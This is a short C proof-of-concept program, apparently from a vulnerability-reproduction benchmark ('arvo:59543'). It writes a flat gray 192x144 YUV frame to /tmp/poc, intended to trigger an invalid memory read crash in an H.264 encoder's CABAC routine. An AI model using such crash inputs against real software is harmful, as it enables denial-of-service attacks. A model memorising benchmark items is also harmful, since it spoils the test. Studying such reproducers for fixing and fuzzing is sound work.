#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:59543 */
/* Triggers: SEGV (wild-addr-read) in ih264e_cabac_put_byte() */
/* Vulnerability: CABAC entropy encoding P-slice macroblock causes invalid memory read */

int main(void) {
    /* Width and height: small values that trigger the P-slice CABAC path */
    unsigned int width = 192;
    unsigned int height = 144;

    /* Total Y plane size: width * height = 192 * 144 = 27648 */
    unsigned int y_size = width * height;
    /* Total UV planes: (width/2) * (height/2) each = 96 * 72 = 6912 each */
    unsigned int uv_width = width / 2;
    unsigned int uv_height = height / 2;
    unsigned int uv_size = uv_width * uv_height;

    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write width (4 bytes, little-endian) */
    fwrite(&width, 4, 1, f);
    /* Write height (4 bytes, little-endian) */
    fwrite(&height, 4, 1, f);

    /* Write luma Y plane: flat gray (0x80) */
    unsigned int i;
    for (i = 0; i < y_size; i++) {
        fputc(0x80, f);
    }

    /* Write Cb U plane: flat (0x80) */
    for (i = 0; i < uv_size; i++) {
        fputc(0x80, f);
    }

    /* Write Cr V plane: flat (0x80) */
    for (i = 0; i < uv_size; i++) {
        fputc(0x80, f);
    }

    fclose(f);
    return 0;
}